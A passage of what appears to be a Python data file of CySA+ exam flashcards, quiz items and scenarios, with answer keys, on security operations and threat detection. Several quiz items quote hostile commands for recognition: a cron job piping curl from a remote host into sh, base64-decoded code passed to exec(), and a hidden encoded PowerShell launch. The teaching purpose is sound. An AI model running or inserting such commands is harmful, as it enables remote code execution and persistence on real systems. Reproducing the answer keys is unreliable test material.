  ["It reduces latency on encrypted connections", "Malware increasingly hides delivery and command-and-control inside encrypted traffic", "It is required before certificates can be issued", "It allows certificates to be revoked more quickly"], 1,
  "Encryption protects attacker traffic as effectively as legitimate traffic, so without inspection a large share of malicious activity is invisible to network controls. The trade-off is a decryption point that becomes both a privacy concern and a high-value target."),
 ("1.1", "A certificate's private key is believed stolen, but the certificate does not expire for another year. What addresses this?",
  ["Reissuing the certificate with a shorter lifetime", "Publishing the revocation and ensuring clients check CRL or OCSP", "Rotating the root CA key", "Enabling SSL inspection on the egress firewall"], 1,
  "A certificate stays valid until expiry unless it is revoked, so reissuing alone leaves the stolen one working. Revocation only protects you if clients actually check it — an unchecked CRL is the quiet failure here."),
 ("1.1", "Security needs visibility into which cloud applications staff use and the ability to stop regulated data being uploaded to them. Which control fits?",
  ["A next-generation firewall", "A cloud access security broker", "Software-defined networking", "A privileged access management platform"], 1,
  "A CASB sits between users and cloud services, giving discovery of sanctioned and unsanctioned use plus policy enforcement including DLP. A firewall can block destinations but lacks application-level context, and the other two solve unrelated problems."),
 ("1.1", "An organization runs identity on-premises and in the cloud, with both systems authoritative for some accounts. What risk does this introduce?",
  ["Encryption in transit is weakened", "Gaps open where the two systems overlap and ownership is unclear", "Logging levels cannot be standardized", "Containers can no longer be segmented"], 1,
  "Hybrid environments inherit the risks of both and add the seams between them. Duplicated processes with ambiguous ownership are where accounts get missed during deprovisioning and where logging quietly stops."),
 ("1.1", "Why is /proc useful during a live investigation on Linux?",
  ["It stores historical authentication records", "It exposes running process and kernel state as readable files", "It holds the system's configuration files", "It contains scheduled task definitions"], 1,
  "/proc is a virtual filesystem representing kernel and process state, so you can read what a process is doing, what it has open and what launched it with ordinary file tools. Authentication history is in /var/log, configuration in /etc."),
 ("1.5", "A workflow pulls an indicator from an alert, queries three intelligence sources, updates the ticket and notifies the on-call analyst. Which term best describes this?",
  ["Automation, because no human performs the steps", "Orchestration, because several tools are coordinated into one sequence", "Enrichment, because external data is added", "Integration, because the tools are connected"], 1,
  "Each individual step is automated, but the defining feature here is that distinct tools are coordinated and sequenced into a single workflow — that is orchestration. Enrichment describes one step within it, and integration is the plumbing that makes it possible."),
 ("1.5", "Which of these is the poorest candidate for full automation?",
  ["Extracting indicators from a phishing report and querying reputation services", "Deciding whether an anomalous transfer by a senior employee is malicious or authorized", "Opening a ticket when an endpoint agent reports a detection", "Pulling and normalizing daily threat feed updates"], 1,
  "The others are repeatable with predictable inputs. Assessing whether unusual behavior by a specific person is legitimate requires context no rule encodes, and automating it does not remove the judgment — it just makes the wrong call faster and without an owner."),
 ("1.5", "Why is standardizing a response process a prerequisite for automating it rather than an optional first step?",
  ["It reduces the licensing cost of the automation platform", "Automation reproduces the existing process at scale, including its inconsistencies", "Automation platforms cannot execute undocumented steps", "Auditors require documentation before automation is permitted"], 1,
  "Automation is a multiplier, not a corrector. Pointing it at an ad-hoc process propagates that inconsistency across every incident at machine speed. Standardizing first decides what is being multiplied."),
 ("1.5", "After an incident, regulators ask which containment actions were taken and when. Which property of a SOAR platform answers this?",
  ["Its ability to trigger firewall and endpoint actions", "The audit trail it records as playbooks execute", "Its single pane of glass dashboard", "Its integration with threat intelligence feeds"], 1,
  "Triggering actions is what it does; recording them is what answers the question. The automatic, timestamped record of which playbook ran and what it changed is precisely the evidence that manual response under pressure tends not to produce."),
 ("1.5", "Your SIEM must learn about detections from a cloud security tool as soon as they occur, without querying it every minute. What fits?",
  ["An API poll on a short interval", "A webhook from the cloud tool to the SIEM", "A plugin installed in the SIEM", "A scheduled export of the tool's logs"], 1,
  "A webhook inverts the direction: the source notifies you at the moment of the event. Polling adds latency bounded by the interval and spends calls on nothing most of the time, which is the trade-off the question is testing."),
 ("1.5", "An analyst receives an alert for a single suspicious process execution. Enriching it with MITRE ATT&CK context primarily provides what?",
  ["Confirmation that the alert is a true positive", "The technique it corresponds to, and therefore what to look for before and after it", "The severity score the alert should carry", "Attribution of the activity to a named threat actor"], 1,
  "ATT&CK maps the observation to a technique within a tactic, which tells the analyst where in an attack sequence this sits and what commonly accompanies it. It neither confirms the alert nor attributes it; those remain analytical judgments."),
 ("1.5", "A SOC runs a dashboard consolidating every tool into one view. What is the most important limitation to keep in mind?",
  ["It cannot display data from cloud-based tools", "A unified view shows what the underlying tools report, so gaps in them become invisible gaps on the dashboard", "It prevents analysts from using the native tool consoles", "It introduces latency into alerting"], 1,
  "Consolidation improves situational awareness but inherits the coverage of its sources. A quiet dashboard is indistinguishable from a dashboard whose feeds have stopped, which is why a single pane is an aid to judgment rather than a substitute for verifying coverage."),
 ("1.5", "Your EDR vendor offers an optional module adding email attachment analysis. Integrating it is an example of which?",
  ["An API integration", "A plugin extending the existing tool", "A webhook subscription", "Orchestration of two platforms"], 1,
  "Nothing new is being connected — one tool is gaining a capability it lacked, which is what a plugin does. An API would be the answer if two independent systems needed to exchange data."),
 ("1.1", "An organization deploys DLP and configures rules for credit card patterns, but regulated data keeps leaving in internal documents. What step was most likely skipped?",
  ["Enabling inspection on the network egress point", "Discovering and classifying sensitive data across its repositories", "Enabling SSL inspection so DLP can read encrypted traffic", "Extending DLP coverage to the endpoint"], 1,
  "Pattern rules catch structured data like card numbers and little else. Without discovery and classification, the tool has no way to recognize a sensitive document as sensitive, so everything unstructured passes. The other options extend reach but not recognition."),
 ("1.1", "A foothold is exfiltrating data over HTTPS to an external host. Which control makes this visible?",
  ["Network segmentation", "SSL/TLS inspection at the egress point", "Multifactor authentication", "A cloud access security broker"], 1,
  "To a firewall without decryption the traffic is indistinguishable from ordinary browsing. Inspection is what turns the egress channel from a blind spot into something inspectable, which matters as much for data leaving as for malware arriving."),
 ("1.1", "Which best describes why passwordless authentication resists phishing?",
  ["The credential is longer and more complex than a password", "There is no reusable secret for the user to disclose", "It always requires three separate factors", "The credential is rotated automatically on every login"], 1,
  "Phishing works by persuading someone to hand over a secret that the attacker can then replay. A biometric, a device-bound key or a one-time code is not a reusable secret the user can be talked into giving away, which removes the mechanism rather than hardening it."),
]

SCENARIOS = [
 ("1.2", "At 02:40 a workstation in accounts begins contacting an external address every 45 seconds. Each connection is under 1 KB. Over the next hour the same host also connects to eleven other workstations on port 445, and a scheduled task appears running a script from the user's AppData directory.",
  "Which conclusion is best supported by these three observations together?",
  ["A misconfigured backup agent is retrying", "An established foothold that is beaconing, moving laterally and persisting", "A vulnerability scanner running out of hours", "Normal patch deployment activity"], 1,
  "Each indicator alone has innocent explanations. Together — regular small outbound check-ins, workstation-to-workstation SMB, and a scheduled task running from a user-writable path — they describe command and control, lateral movement and persistence."),
 ("1.1", "A developer reports that an internal API is unreachable from the new analytics subnet, though it works from the application subnet. Both are inside the corporate network, and the API host is up with the service listening.",
  "What is the most likely cause, and what does it indicate about the design?",
  ["A DNS failure; the design is sound", "Segmentation policy between zones is working as intended and the new subnet was not granted access", "The API service needs restarting", "Zero trust requires the API to be public"], 1,
  "Reachability differing by source subnet, with the service healthy, points at segmentation policy. That is the control doing its job — the gap is a provisioning step, not a fault."),
 ("1.3", "An email claiming to be from a supplier asks finance to update bank details. SPF passes, DKIM passes, DMARC passes. The display name matches the supplier. The reply-to address is a lookalike domain registered six days ago.",
  "What is the correct read of this evidence?",
  ["Authentication passed, so the message is legitimate", "The checks passed for the attacker's own domain; authentication proves control of a domain, not trustworthiness", "DMARC must be misconfigured", "The supplier's mail server has been compromised"], 1,
  "SPF, DKIM and DMARC can all pass for a domain an attacker owns. They verify that a domain authorized and signed the message — not that the domain deserves trust. The six-day-old lookalike domain is the real signal."),
 ("1.2", "A web server's CPU sits at 95% for three days. There is no increase in site traffic, no new deployment, and response times for legitimate requests are unchanged. An unfamiliar process is running as the web service account.",
  "Which explanation best fits all of the evidence?",
  ["A denial-of-service attack in progress", "Cryptomining using the host's spare capacity", "A memory leak in the application", "Scheduled backup jobs overlapping"], 1,
  "Sustained processor consumption with unchanged traffic and unaffected response times fits mining, which uses spare cycles. A denial-of-service attack would degrade legitimate responses, and a memory leak would show in memory, not CPU."),
 ("1.3", "You are handed a suspicious attachment from a quarantined message. Company policy forbids uploading customer-originated files to third-party services.",
  "What is the appropriate sequence?",
  ["Upload to a public sandbox, then review the report", "Hash it and check the hash against reputation services, then detonate it in an internal sandbox if still unknown", "Open it in a virtual machine on your workstation", "Forward it to the vendor for analysis"], 1,
  "Hashing discloses nothing and often answers the question immediately. If the sample is unknown, an internal sandbox gives you behavior without sending customer content outside the organization."),
 ("1.5", "Your SOC handles roughly 200 alerts a day. For each one an analyst looks up the source IP's geolocation and reputation, checks whether the destination domain is newly registered, opens a ticket and attaches the findings. Mean time to triage is 14 minutes.",
  "Where should automation be applied first, and why?",
  ["Automate the decision to escalate, since that is the slowest step", "Automate the enrichment and ticket creation, leaving the judgment to the analyst", "Automate alert suppression to reduce volume", "Replace the SIEM with a SOAR platform"], 1,
  "Enrichment and ticketing are repeatable and judgment-free, which is the test for automation. Suppressing alerts hides the problem, and escalation decisions are precisely what should stay human."),
 ("1.1", "During an investigation you need to establish what a serverless function did three weeks ago. There is no persistent host, and the function has been redeployed twice since.",
  "What is your realistic source of evidence?",
  ["A disk image of the execution host", "The cloud provider's logs and the function's deployment history", "Memory capture from the running function", "The container image it was built from"], 1,
  "Serverless leaves nothing to image. Provider-side logs and deployment history are the evidence, which is why log retention policy matters far more in these architectures."),
 ("1.2", "A privileged account is added to Domain Admins at 23:12. At 23:14 a new local account is created on two file servers. At 23:20 archive files totalling 40 GB appear in a temp directory on one of them.",
  "What stage of the attack do these observations indicate?",
  ["Initial reconnaissance", "Privilege escalation, persistence and staging for exfiltration", "A failed intrusion attempt", "Routine administrative maintenance"], 1,
  "Privilege gained, independent accounts created so the original access is no longer needed, then data collected and compressed in one place. The archives have not left yet — which is the window in which containment still prevents the loss."),
 ("1.4", "A paid feed reports a new ransomware family targeting healthcare, with hashes and C2 addresses, published this morning. You are a regional logistics firm. Separately, your own EDR has flagged the same living-off-the-land command pattern on three hosts over two weeks.",
  "Where should the analyst's effort go, and on what reasoning?",
  ["The feed, because it is the newest intelligence", "The internal pattern, because internal telemetry is perfectly relevant and the behavior is recurring", "Both equally, splitting time evenly", "Neither until the feed is corroborated by a second source"], 1,
  "The feed is timely and accurate but fails relevancy — different sector, no stated overlap. The internal observation is relevant by definition, recurring, and behavior-based, which makes it both more credible and more actionable."),
 ("1.4", "During a hunt you find a development subnet with no monitoring, flat internal access to production databases, and three hosts still running an operating system that left support eight months ago.",
  "Which focus area does this exemplify, and what is the compounding risk?",
  ["Business-critical assets; the databases are valuable", "Isolated networks plus misconfiguration; unmonitored segments let activity go unnoticed while the flat access makes it reachable", "Supply chain; the vendor stopped issuing patches", "Active defense; the subnet should host a honeypot"], 1,
  "Two focus areas intersect. The segment is unwatched, which removes detection, and the flat path to production removes containment — so a foothold there is both invisible and well-placed."),
 ("1.1", "A finance workstation is quarantined after an alert. You find a process named svchost.exe running from the user's AppData folder, its parent is a document editor, and it opened an outbound connection shortly after a file was opened. The host's Security log shows a successful interactive logon twelve minutes earlier.",
  "Which single observation most justifies treating this as malicious rather than unusual?",
  ["The outbound connection, since the host does not normally initiate traffic", "The executable path, because a genuine svchost.exe only runs from a protected system directory", "The parent process, because document editors do not normally launch children", "The timing, because the logon and the execution are close together"], 1,
  "Each observation is suggestive, but only the path is conclusive on its own: the real binary lives in the system directory and cannot legitimately run from a user-writable profile folder. The parent process and the timing build the story of how it arrived; they do not by themselves prove it."),
 ("1.1", "After a merger, staff from the acquired company need access to several of your internal applications. They keep their existing accounts and identity provider. Your team wants one sign-in experience, no new accounts created locally, and the ability to cut access off centrally on the day someone leaves the other organization.",
  "What should be implemented?",
  ["Single sign-on within your own domain, with accounts created for each new user", "A federated trust between the two identity providers", "A cloud access security broker in front of the applications", "Privileged access management covering the new accounts"], 1,
  "The requirements name federation precisely: identities stay with their home organization, trust is established between providers, and deprovisioning at the source removes access everywhere. Creating local accounts would meet the sign-in requirement but breaks the leaver requirement, which is the one that matters."),
 ("1.1", "An investigation into a two-week-old intrusion stalls. Firewall logs are in UTC, the Windows hosts are in local time with daylight saving, and an application server drifted eleven minutes because NTP was blocked outbound. Analysts have built correlation rules with a fifteen-minute window to compensate.",
  "What is wrong with the current approach?",
  ["The window is too narrow to catch slow attacks", "The wide window conceals the clock problem and produces false correlations", "Logging levels are set too low on the application server", "The logs should be re-parsed into a single schema"], 1,
  "Widening the window is compensation, not a fix: it makes unrelated events within fifteen minutes appear connected while still failing to order the real ones. The timeline stays unreliable until the sources share a clock, and every conclusion drawn from it inherits the error."),
 ("1.1", "A developer requests an exception so that a new payment feature can log full card numbers temporarily, to debug a failing transaction flow. The logs ship to the central SIEM, which is retained for a year and readable by the whole security team.",
  "What is the strongest objection?",
  ["The logging level is too verbose and will increase storage costs", "It would place cardholder data into a system with broad access and long retention, expanding PCI DSS scope", "Debug logging should never be enabled in production", "The SIEM cannot parse card numbers correctly"], 1,
  "The issue is not volume but scope: writing CHD into the SIEM drags that platform, its retention and everyone with access to it into PCI DSS scope. Debug logging in production is sometimes defensible; moving regulated data into a general-purpose store to achieve it is not."),
 ("1.5", "Your SOAR playbook automatically isolates any host that triggers a particular detection. Overnight it fires on a database server during a backup window, isolating it and causing a four-hour outage. Investigation shows the detection logic was correct — the backup agent genuinely matched the pattern — and the playbook did exactly what it was built to do.",
  "What is the right corrective action?",
  ["Disable automated isolation and return containment to analysts", "Keep the automation but add context checks and an approval step for high-value assets", "Tune the detection so the backup agent no longer matches", "Move isolation into a scheduled job that runs outside backup windows"], 1,
  "The detection worked and the automation worked; what was missing was any recognition that the target mattered. Removing automation forfeits containment speed for every ordinary case, and tuning the detection hides a true positive. Keeping the speed while gating the irreversible action on asset context addresses the actual failure."),
 ("1.5", "A four-person SOC handles about 300 alerts a day. Roughly 60% are a single alert type that is resolved by checking two internal systems and closing the ticket, taking three minutes each. The remaining alerts vary and often need real investigation. Analysts report they rarely get through the backlog and the complex alerts wait longest.",
  "Which intervention addresses the underlying problem?",
  ["Hire additional analysts to increase total capacity", "Automate the high-volume repetitive alert type end to end, freeing analyst time for the rest", "Raise the alerting threshold so fewer alerts are generated", "Build a dashboard giving better visibility into the queue"], 1,
  "Nine hours a day of a four-person team is being spent on work with no judgment in it, which is exactly the profile automation exists for. Raising thresholds reduces volume by discarding signal, more staff scales the inefficiency, and visibility into a queue does not shorten it."),
 ("1.5", "Your organization subscribes to one well-regarded commercial threat feed. Following an intrusion, review shows the initial indicator had been reported in an open-source community database eleven days earlier and had also appeared in your own proxy logs as an unusual destination, but neither source was being correlated against alerts.",
  "What does this most clearly demonstrate?",
  ["The commercial feed should be replaced with a better one", "Feeds from different origins have different coverage, and internal data is a source in its own right", "The proxy logs should have been retained longer", "Open-source feeds are more reliable than commercial ones"], 1,
  "No single feed sees everything, and the gap here was filled independently by an open-source source and by the organization's own telemetry — the one dataset no vendor has. The lesson is combination and correlation, not that one provider is better than another."),
]

OBJTITLE = {"1.1": "System & Network Architecture", "1.2": "Indicators of Malicious Activity", "1.3": "Tools & Techniques", "1.4": "Threat Intelligence & Hunting", "1.5": "Efficiency & Process Improvement"}

# ---------------------------------------------------------------------------
# Added 2026-10-25 after mining all class material (13 transcripts, Day 1-6
# decks with speaker notes, flashcards) and classifying each topic against
# build/cysa-spine.json. Original prose.
#
# EXAM OBJECTIVE gaps found: 1.3 names JSON, XML, Python, PowerShell and shell
# script among the languages an analyst reads; 1.4 names information sharing
# organizations. Neither was drilled.
# ---------------------------------------------------------------------------

FLASHCARDS += [
 ("1.3", "Why does an analyst need to read JSON, and what does it look like?",
  "Most API responses, cloud audit logs and SIEM events arrive as JSON: key-value pairs in braces, lists in brackets, nested freely. Reading it means finding the fields that matter, such as source address, user, action and result, inside a deeply nested record. Tools like jq filter it from the command line."),
 ("1.3", "Where does an analyst meet XML?",
  "Windows event logs exported from Event Viewer, SAML authentication assertions, many older APIs and configuration files, and some threat intelligence feeds. It is tag-based: elements open and close, with attributes inside the tags. XML parsers are also an attack surface, which is where XXE comes from."),
 ("1.3", "What is Python typically used for in security operations?",
  "Automation: parsing logs, calling threat intelligence and SIEM APIs, enriching indicators, decoding obfuscated data. Analysts also read Python because attackers use it. Lines that decode base64 and pass the result to exec() or eval() are a classic sign of hidden code."),
 ("1.3", "What should make you look twice when reading a shell or PowerShell script?",
  "Downloading and executing in one step (curl or wget piped to sh; IEX with DownloadString), encoded commands (PowerShell -EncodedCommand or -enc), writes to cron, systemd, Run keys or scheduled tasks, disabled logging or history, and anything that deletes its own file. Each is a hallmark of a dropper or persistence."),
 ("1.4", "What is an ISAC?",
  "An Information Sharing and Analysis Center: a sector-specific body where member organizations share threat indicators, alerts and incident experience with each other. Examples include FS-ISAC for finance, Health-ISAC for healthcare and MS-ISAC for US state and local government. The value is intelligence from peers facing the same adversaries."),
 ("1.4", "Which public bodies publish threat information an analyst should follow?",
  "Government agencies such as CISA in the US, which publishes advisories and the Known Exploited Vulnerabilities catalog; national CERTs and CSIRTs; and the ISACs for each sector. Government and sector sources are often the first to say a vulnerability is being exploited in the wild."),
]

QUIZ += [
 ("1.3", "A log record reads {\"src\":\"203.0.113.5\",\"user\":\"svc_backup\",\"action\":\"deny\"}. Which format is it?",
  ["XML", "JSON", "CSV", "Syslog RFC 5424"],
  1, "Braces around quoted key-value pairs separated by colons and commas are JSON. XML uses opening and closing tags, CSV uses delimited columns with no keys, and syslog is a header followed by free text."),
 ("1.3", "A script contains: import base64; exec(base64.b64decode('aW1wb3J0IG9z...')). What is the concern?",
  ["Nothing; base64 is a standard encoding", "Hidden code: the real instructions are encoded and executed at runtime", "It is a syntax error and will not run", "It only encrypts data at rest"],
  1, "Encoding code and running it through exec() hides what the script really does from anyone skimming it and from simple signatures. Decode the string before trusting the script. Base64 is encoding, not encryption."),
 ("1.3", "A cron entry reads: */5 * * * * curl -s http://198.51.100.7/u.sh | sh. What does it do?",
  ["Checks a web page for updates every five minutes", "Downloads a script from a remote host and runs it every five minutes", "Uploads logs to a central server", "Runs a local shell script at startup"],
  1, "Piping a downloaded file straight into sh means whatever the remote host serves gets executed, every five minutes, as the cron owner. It is both persistence and a channel the attacker can update at will."),
 ("1.3", "A process launches powershell.exe -nop -w hidden -enc SQBFAFgA... What does -enc indicate?",
  ["The script output is encrypted", "The command is passed base64-encoded, which hides it from casual inspection", "PowerShell is running in constrained language mode", "The command will only run on encrypted volumes"],
  1, "-enc (EncodedCommand) takes a base64-encoded command. Combined with -nop (no profile) and -w hidden (hidden window), it is a very common malicious pattern. Decode it to see the real command; script block logging records it decoded."),
 ("1.4", "A hospital wants threat intelligence from peers facing the same attackers. Which source fits best?",
  ["A general-purpose OSINT feed", "Health-ISAC", "The vendor's antivirus signature updates", "An internal honeypot"],
  1, "An ISAC exists to share sector-specific intelligence among members. Health-ISAC members see the campaigns aimed at healthcare first and share indicators and context that generic feeds lack."),
]

# ---------------------------------------------------------------------------
# GENERAL KNOWLEDGE: cybersecurity material from the class that is NOT on the
# CS0-003 objectives (checked against cysa-spine.json). Filed under the nearest
# Domain 1 objective, badged "General knowledge" on the page, hidden by the
# "Exam only" toggle, and scored separately from objective accuracy.
# ---------------------------------------------------------------------------

GK_FLASHCARDS = [
 ("1.1", "What is LDAP, and which ports does it use?",
  "The Lightweight Directory Access Protocol, used to query and modify directory services such as Active Directory and OpenLDAP. TCP 389 is cleartext (optionally upgraded with StartTLS); 636 is LDAPS over TLS. Attackers use LDAP queries to enumerate users, groups and computers after gaining a foothold."),
 ("1.1", "How does Kerberos authentication work in Active Directory?",
  "The Key Distribution Center on a domain controller issues a ticket-granting ticket at logon, and the client trades it for service tickets for each resource, so passwords are not sent to every server. It runs on port 88 and rejects clocks more than five minutes apart by default, which is another reason time synchronization matters."),
 ("1.1", "What does Group Policy do, and which commands check it?",
  "Group Policy Objects push settings (password policy, security baselines, software restrictions) to computers and users by site, domain or organizational unit. gpupdate /force pulls the latest policy now; gpresult /r shows which policies actually applied to a machine and user."),
 ("1.1", "What is SAML, and how is trust established?",
  "Security Assertion Markup Language: an XML format in which an identity provider sends a signed assertion about a user to a service provider, enabling web single sign-on. The service provider trusts the assertion because it is configured with the identity provider's public signing certificate. OAuth is authorization; OpenID Connect adds authentication on top of OAuth."),
 ("1.1", "Compare DAC, MAC, RBAC and ABAC.",
  "DAC: the owner decides who gets access (NTFS default).\nMAC: the system enforces access from labels the user cannot change (SELinux, classified systems).\nRBAC: access follows job roles.\nABAC: access follows attributes and conditions, such as department, device or time (Azure dynamic groups, Windows Dynamic Access Control claims)."),
 ("1.1", "A user reaches a folder over the network. How do share and NTFS permissions combine?",
  "Both apply and the more restrictive wins. Share permissions apply only to network access; locally, only NTFS applies. An explicit deny overrides an allow. This is why an investigation into file access checks both layers."),
 ("1.1", "Linux account and permission basics an analyst should know.",
  "chmod sets permissions (755 = rwx for owner, r-x for group and others). sudo grants elevated commands, configured in sudoers, which should be edited with visudo because it checks syntax. Password hashes live in /etc/shadow (root only); /etc/passwd is world-readable and holds no hashes."),
 ("1.1", "EFS versus BitLocker.",
  "EFS encrypts individual files and folders per user on NTFS. BitLocker encrypts the whole volume and normally keeps its key in the TPM so the disk will not unlock in another machine. BitLocker protects a stolen laptop; EFS protects files from other users of the same machine. Recovery keys must be escrowed, or encryption becomes data loss."),
 ("1.1", "TPM versus HSM.",
  "A TPM is a chip on one device that stores keys and measures the boot process, tying secrets to that machine. An HSM is a dedicated, tamper-resistant appliance or PCIe card that generates and protects keys for an organization, such as a CA's signing key. Cloud key vaults and KMS are managed HSM services."),
 ("1.1", "CRL versus OCSP.",
  "Both tell a client whether a certificate has been revoked. A CRL is a signed list the client downloads periodically, so it can be stale. OCSP answers a real-time query about one certificate. OCSP stapling has the server attach a fresh OCSP response during the TLS handshake."),
 ("1.1", "What does a code-signing certificate prove, and what does it not?",
  "It proves who published the code and that it has not changed since signing. It does not prove the code is safe: stolen and fraudulently issued signing certificates have signed real malware. A valid signature lowers suspicion; it does not end the investigation."),
 ("1.1", "GDPR, HIPAA, CCPA and PCI DSS: what does each cover?",
  "GDPR: personal data of people in the EU, whoever processes it; breaches reported to the authority within 72 hours.\nHIPAA: US protected health information held by covered entities and their business associates.\nCCPA (amended by CPRA): personal information of California residents.\nPCI DSS: cardholder data; a contractual industry standard, not a law."),
 ("1.1", "PII, PHI, SPI, EHR and PHR.",
  "PII identifies a person. PHI is health information tied to an individual. SPI is the especially sensitive subset, such as religion, political opinion, health and sexual orientation (GDPR's special categories). An EHR is the record a healthcare provider keeps; a PHR is a record the patient manages."),
 ("1.1", "Name three data classification tools and what each does.",
  "Amazon Macie: discovers sensitive data in S3 buckets using pattern matching and machine learning. Microsoft Purview Information Protection (formerly Azure Information Protection): applies sensitivity labels that can encrypt and restrict documents. Windows File Server Resource Manager: classifies files on a file server by rules. Classification has to come before DLP can act on it."),
 ("1.1", "How is DHCP abused, and what defends it?",
  "A rogue DHCP server hands out its own gateway or DNS server to intercept traffic; a starvation attack exhausts the address pool. DHCP snooping on switches allows offers only from trusted ports. DHCP logs, which map IP to MAC address to time, are also how you attribute activity to a device."),
 ("1.1", "WPA2-Personal, WPA2/WPA3-Enterprise and WPA3-Personal.",
  "Personal modes use one shared passphrase. Enterprise modes use 802.1X, sending each user's credentials to a RADIUS server, so access can be revoked per person. WPA3-Personal replaces the pre-shared key handshake with SAE, which resists offline dictionary attacks. WEP and TKIP are broken."),
 ("1.1", "What does DNSSEC protect, and what does it not?",
  "It digitally signs DNS records so a resolver can verify they are authentic and unaltered, which defeats cache poisoning. It does not encrypt queries; DNS over HTTPS and DNS over TLS do that."),
 ("1.1", "Stateless, stateful, next-generation and web application firewalls.",
  "Stateless: judges each packet alone against ACL rules. Stateful: tracks connections, so return traffic is allowed automatically. NGFW: adds application awareness, user identity and IPS. WAF: inspects HTTP itself to block attacks such as SQL injection and XSS."),
 ("1.1", "IDS versus IPS, and network versus host.",
  "An IDS detects and alerts; an IPS sits inline and can block. NIDS and NIPS watch network traffic; HIDS and HIPS watch one host's files, logs and processes. Detection is by signature (known patterns) or anomaly (deviation from a baseline)."),
 ("1.1", "How do firewall rule order and implicit deny work?",
  "Rules are evaluated top down and the first match wins, so a broad allow above a specific deny makes the deny useless. Traffic matching no rule is dropped by the implicit deny at the end. Windows Defender Firewall blocks unsolicited inbound traffic by default."),
 ("1.1", "What is a bastion host (jump box)?",
  "A single hardened, heavily logged entry point for administrators to reach systems in a private network, so management ports are never exposed directly. Azure Bastion and AWS bastion instances are cloud forms. Put MFA and session recording there."),
 ("1.1", "CIDR basics for cloud network planning.",
  "The prefix length says how many bits are network: /24 is 256 addresses, /16 is 65,536. Cloud VPCs and virtual networks are sized in CIDR, and overlapping ranges prevent peering or VPN connections between them, which is a common reason segmentation plans fail."),
 ("1.1", "MBR versus GPT, and why it matters for security.",
  "MBR allows four primary partitions and disks up to 2 TB, and its boot code is a classic bootkit target. GPT supports far more partitions and larger disks, and UEFI Secure Boot, which checks boot components' signatures, requires it."),
 ("1.1", "What is a CMDB?",
  "A configuration management database: the authoritative record of configuration items (servers, applications, network devices) and how they depend on each other. Vulnerability scope, incident impact and change risk all depend on it being accurate."),
 ("1.3", "Splunk essentials.",
  "Data lands in indexes (the default is main). Universal forwarders on hosts ship logs to the indexer. Searches use SPL. Roles control which indexes a user may search. 'splunk add monitor' tells a forwarder which files or directories to collect."),
 ("1.3", "What is Microsoft Sentinel?",
  "Microsoft's cloud-native SIEM and SOAR in Azure. Data connectors bring in logs, KQL queries hunt through them, analytics rules raise incidents, and playbooks built on Logic Apps automate the response."),
 ("1.3", "Essential tcpdump options.",
  "-i chooses the interface, -n skips name lookups, -s0 captures whole packets, -w writes a pcap for Wireshark, -A prints payloads as ASCII. Filters go last, without dashes: host 10.0.0.5 and port 22."),
 ("1.3", "Which OSI layer does each part of a Wireshark packet belong to?",
  "Ethernet frame: layer 2. IP header: layer 3. TCP or UDP header: layer 4. Application data such as HTTP or DNS: layer 7. Display filters such as ip.addr==10.0.0.5 and tcp.port==443 narrow a capture."),
 ("1.2", "Why are Modbus and S7comm a monitoring priority in ICS networks?",
  "Both industrial protocols (Modbus TCP on port 502, S7comm on 102) were designed without authentication, so any device that can reach a controller can send it commands. Write commands from an unexpected host are a high-priority alert."),
 ("1.2", "How does a SYN flood work, and what blunts it?",
  "The attacker sends many SYNs and never completes the handshake, filling the server's table of half-open connections so real clients cannot connect. SYN cookies let the server avoid storing state until the handshake completes."),
 ("1.2", "What is a slow HTTP denial of service?",
  "Opening many connections and sending headers or bodies very slowly (Slowloris; the slowhttptest tool simulates it) so the server keeps every connection open and runs out of workers, using almost no bandwidth. Defenses are request timeouts, per-client connection limits and a reverse proxy in front."),
 ("1.4", "STIX versus TAXII.",
  "STIX is the language: a structured format (JSON in version 2) for describing indicators, malware, threat actors and the relationships between them. TAXII is the transport: an HTTPS-based protocol for sharing STIX between organizations."),
 ("1.4", "How do CVE and the NVD relate?",
  "CVE assigns each publicly known vulnerability an ID (CVE-year-number) through numbering authorities overseen by MITRE. NIST's National Vulnerability Database enriches each CVE with CVSS scores, affected product identifiers (CPE) and weakness types (CWE)."),
 ("1.4", "What is BeEF, and what does it demonstrate?",
  "The Browser Exploitation Framework. A hook script, usually injected through an XSS flaw, gives the tester control of the victim's browser: fingerprinting, phishing prompts and pivoting. It shows why XSS is more than an alert box."),
 ("1.4", "Kali Linux, DVWA and hping3.",
  "Kali Linux is a penetration-testing distribution with hundreds of tools preinstalled. DVWA is a deliberately vulnerable web application for safe practice and must never face the internet. hping3 crafts custom TCP, UDP and ICMP packets for firewall testing, scanning or flooding."),
]

GK_QUIZ = [
 ("1.1", "A folder's share permission grants Everyone Full Control, and its NTFS permission grants a user Read. What can the user do over the network?",
  ["Full Control", "Read", "Nothing", "Modify"],
  1, "Over the network both layers apply and the more restrictive wins, so Read. Share permissions often stay wide open and NTFS does the real work."),
 ("1.1", "How does a SAML service provider know an assertion really came from the identity provider?",
  ["The assertion travels over HTTPS", "It verifies the assertion's signature with the identity provider's public certificate", "The user's password is included in the assertion", "The identity provider's IP address is allowlisted"],
  1, "Trust is cryptographic: the identity provider signs each assertion, and the service provider validates it with the certificate it was configured with. HTTPS protects the transport but does not prove who wrote the assertion."),
 ("1.1", "Which Wi-Fi configuration lets you revoke one employee's wireless access without changing anyone else's?",
  ["WPA2-Personal", "WPA3-Personal", "WPA2/WPA3-Enterprise with 802.1X and RADIUS", "Hidden SSID"],
  2, "Enterprise mode authenticates each user individually against a RADIUS server, so disabling one account removes one person. Personal modes share a passphrase, and a hidden SSID is not access control."),
 ("1.1", "What does DNSSEC provide?",
  ["Encryption of DNS queries", "Authenticity and integrity of DNS records", "Anonymity for DNS clients", "Faster DNS resolution"],
  1, "DNSSEC signs records so resolvers can detect forgery and tampering. It does not hide queries; encryption is DNS over HTTPS or TLS."),
 ("1.1", "A browser must check a certificate's revocation status in real time. Which mechanism fits?",
  ["CRL", "OCSP", "CSR", "PFX"],
  1, "OCSP answers a live query for one certificate. A CRL is a list downloaded periodically, a CSR is a certificate request, and PFX is a file format for a certificate with its private key."),
 ("1.1", "An analyst must find which policies actually applied to a workstation. Which command?",
  ["gpupdate /force", "gpresult /r", "netstat -ano", "ipconfig /all"],
  1, "gpresult reports the resulting policy for the computer and user. gpupdate only refreshes policy; it does not report it."),
 ("1.3", "In Splunk, what ships logs from an endpoint to the indexer?",
  ["A search head", "A universal forwarder", "An index", "A dashboard"],
  1, "The universal forwarder is the lightweight agent on the host that collects and sends data. Indexes store data, search heads run searches, and dashboards display results."),
 ("1.2", "Why is a Modbus write command from an engineering laptop nobody recognizes so serious?",
